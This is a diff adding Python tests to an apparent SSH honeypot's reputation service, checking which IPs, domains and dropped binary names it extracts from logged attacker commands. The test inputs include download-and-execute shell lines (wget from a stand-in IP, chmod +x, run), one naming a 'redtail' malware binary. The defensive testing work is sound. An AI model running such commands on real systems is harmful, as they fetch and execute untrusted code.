@@ -204,3 +204,34 @@ async def test_harmless_does_not_override_malicious():
     brain, _out, _events = await run_session("bot", rep)
     s = await brain.store.get("ssh-bot00001")
     assert s.reputation == "malicious"
+
+
+def _logged_in():
+    s = Session("x", source="wild", src_ip="1.2.3.4", ip_hash="a" * 64)
+    s.add_login(0, "root", True)
+    return s
+
+
+def test_generic_word_filter_is_never_searched():
+    rep = service()
+    raw = {"type": "command", "detail": {"input": "cd /tmp; wget http://203.0.113.9/filter; chmod +x filter; ./filter"}}
+    targets = rep.targets(_logged_in(), raw)
+    # the download host still counts, the generic file name doesn't
+    assert [t.kind for t in targets] == ["ip", "domain"]
+    assert not any("filter" in t.query for t in targets)
+
+
+def test_dropped_binary_name_is_searched_after_the_ip():
+    rep = service()
+    line = "cd /tmp; wget http://203.0.113.9/redtail.x86_64; chmod +x redtail.x86_64; ./redtail.x86_64"
+    targets = rep.targets(_logged_in(), {"type": "command", "detail": {"input": line}})
+    assert [t.kind for t in targets] == ["ip", "domain", "tool"]
+    assert targets[2].query == '"redtail.x86_64" linux malware'
+
+
+def test_ip_lookup_comes_first_even_when_tools_fill_the_cap():
+    rep = service()
+    line = "; ".join(f"wget http://h{i}.example.org/tool{i}bin; ./tool{i}bin" for i in range(6))
+    targets = rep.targets(_logged_in(), {"type": "command", "detail": {"input": line}})
+    assert targets[0].kind == "ip" and targets[0].label == "the attacking ip"
+    assert len(targets) == 4
